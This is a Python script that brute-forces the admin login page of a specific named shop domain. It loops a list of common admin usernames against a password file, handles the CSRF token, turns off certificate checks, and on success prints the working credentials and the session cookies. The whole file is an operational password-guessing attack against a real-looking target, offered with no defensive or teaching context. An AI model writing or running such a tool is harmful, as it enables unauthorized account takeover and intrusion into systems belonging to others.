import httpx, re, sys
c=httpx.Client(verify=False, follow_redirects=False, timeout=20,
    headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121 Safari/537.36'})
URL='https://ofa77.shop/module/admin/unionshop/user/login'
pwds=[l.strip() for l in open('ofa77_pwds.txt') if l.strip()]
# only confirmed-valid usernames
users=['admin','administrator','root','manager','superadmin','ofa77','admin888','admin1','test']
def get_token():
    r=c.get(URL); m=re.search(r'name="_token" value="([^"]+)"', r.text); return m.group(1) if m else None
def try_login(user,pw):
    try:
        tok=get_token()
        r=c.post(URL, data={'_token':tok,'username':user,'password':pw}, allow_redirects=True)
        if r.status_code==302:
            loc=r.headers.get('location','')
            if 'login' not in loc:
                return True, f'REDIRECT {loc}'
        if 'dashboard' in r.text or 'logout' in r.text and '密碼錯誤' not in r.text and '帳號不存在' not in r.text:
            return True, 'DASHBOARD'
        return False, ''
    except Exception as e:
        return False, f'ERR {e}'
count=0
for u in users:
    for p in pwds:
        count+=1
        ok,info=try_login(u,p)
        if ok:
            print(f'*** SUCCESS {u}/{p} -> {info}')
            sys.stdout.flush()
            print('saved session cookies:', dict(c.cookies))
            sys.exit(0)
    print(f'done user {u} ({count} attempts)')
print(f'ALL DONE total={count} attempts, no success')
